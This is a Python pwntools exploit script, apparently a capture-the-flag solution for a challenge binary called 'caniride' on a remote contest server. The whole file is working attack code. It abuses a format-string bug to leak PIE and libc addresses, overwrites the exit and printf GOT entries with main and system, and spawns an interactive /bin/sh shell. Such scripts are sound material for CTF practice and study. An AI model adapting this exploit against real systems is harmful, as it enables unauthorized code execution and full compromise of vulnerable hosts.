from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./caniride')
# p = elf.process()
p = remote('challs.actf.co', 31228)

def write(addr, val):
	s = [u16(p64(val)[i:i+2]) for i in range(0, 6, 2)]
	fmt = b''
	fmt += b'%'
	fmt += str(s[0]).encode('ascii')
	fmt += b'c%16$hn'
	fmt += b'%'
	fmt += str((s[1] - s[0]) & 0xffff).encode('ascii')
	fmt += b'c%17$hn'
	fmt += b'%'
	fmt += str((s[2] - s[1]) & 0xffff).encode('ascii')
	fmt += b'c%18$hn'
	fmt += b'-%19$s'

	p.recv()
	p.sendline(fmt)

	p.recv()
	p.sendline(b'1')
	p.recv()
	p.sendline(p64(addr) + p64(addr + 2) + p64(addr + 4) + p64(got_puts))


p.recv()
p.sendline(b'%105c' + b'%16$hhn')
p.recv()
p.sendline(b'-3')

p.recvuntil(b' is ')

pie_leak = u64(p.recv(6).ljust(8, b'\x00')) - 0x35a8
print(hex(pie_leak))

got_exit = pie_leak + elf.got.exit
main = pie_leak + elf.sym.main
got_puts = pie_leak + elf.got.puts
got_printf = pie_leak + elf.got.printf

p.recv()
p.send(p64(pie_leak + 0x3300))

write(got_exit, main)

libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym.puts
print(hex(libc.address))

system = libc.sym.system

write(got_printf, system)

p.recvuntil(b'Welcome to blairuber!\n')
p.sendline(b'/bin/sh')
p.recvrepeat(0.5)
p.sendline(b'a')
p.recvrepeat(0.5)
p.sendline(b'a')

p.interactive()